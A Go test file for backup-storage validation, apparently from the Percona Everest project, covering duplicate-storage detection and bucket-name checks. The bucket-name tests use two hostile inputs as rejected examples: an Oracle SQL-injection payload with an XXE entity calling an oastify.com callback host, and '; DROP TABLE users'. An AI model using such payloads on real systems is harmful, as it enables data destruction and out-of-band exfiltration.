package validation

import (
	"testing"

	"github.com/AlekSi/pointer"
	"github.com/stretchr/testify/assert"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	everestv1alpha1 "github.com/percona/everest-operator/api/v1alpha1"
	everestapi "github.com/percona/everest/api"
)

func TestValidateDuplicateStorageByUpdate(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name               string
		storages           *everestv1alpha1.BackupStorageList
		currentStorage     *everestv1alpha1.BackupStorage
		currentStorageName string
		params             everestapi.UpdateBackupStorageParams
		isDuplicate        bool
	}{
		{
			name: "another storage with the same 3 params",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket1",
							Region:      "region1",
							EndpointURL: "url1",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Url: pointer.ToString("url1"), BucketName: pointer.ToString("bucket1"), Region: pointer.ToString("region1")},
			isDuplicate:        true,
		},
		{
			name: "change of url will lead to duplication",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket2",
							Region:      "region2",
							EndpointURL: "url1",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Url: pointer.ToString("url1")},
			isDuplicate:        true,
		},
		{
			name: "change of bucket will lead to duplication",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket1",
							Region:      "region2",
							EndpointURL: "url2",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{BucketName: pointer.ToString("bucket1")},
			isDuplicate:        true,
		},
		{
			name: "change of region will lead to duplication",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket2",
							Region:      "region1",
							EndpointURL: "url2",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Region: pointer.ToString("region1")},
			isDuplicate:        true,
		},
		{
			name: "change of region and bucket will lead to duplication",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket1",
							Region:      "region1",
							EndpointURL: "url2",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Region: pointer.ToString("region1"), BucketName: pointer.ToString("bucket1")},
			isDuplicate:        true,
		},
		{
			name: "no other storages: no duplictation",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket2",
							Region:      "region2",
							EndpointURL: "url2",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Url: pointer.ToString("url1"), BucketName: pointer.ToString("bucket1"), Region: pointer.ToString("region1")},
			isDuplicate:        false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tc.isDuplicate, validateDuplicateStorageByUpdate(tc.currentStorageName, tc.currentStorage, tc.storages, &tc.params))
		})
	}
}

func TestValidateBucketName(t *testing.T) {
	t.Parallel()

	type tcase struct {
		name  string
		input string
		err   error
	}

	tcases := []tcase{
		{
			name:  "empty string",
			input: "",
			err:   errInvalidBucketName,
		},
		{
			name:  "too long",
			input: `(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % uicfw SYSTEM \"http:\/\/t93xxgfug88povc63wzbdbsd349zxulx9pwfk4.oasti'||'fy.com\/\">%uicfw;]>'),'\/l') from dual)`,
			err:   errInvalidBucketName,
		},
		{
			name:  "unexpected symbol",
			input: `; DROP TABLE users`,
			err:   errInvalidBucketName,
		},
		{
			name:  "correct",
			input: "aaa-12-d.e",
			err:   nil,
		},
	}

	for _, tc := range tcases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := validateBucketName(tc.input)
			assert.ErrorIs(t, err, tc.err)
		})
	}
}
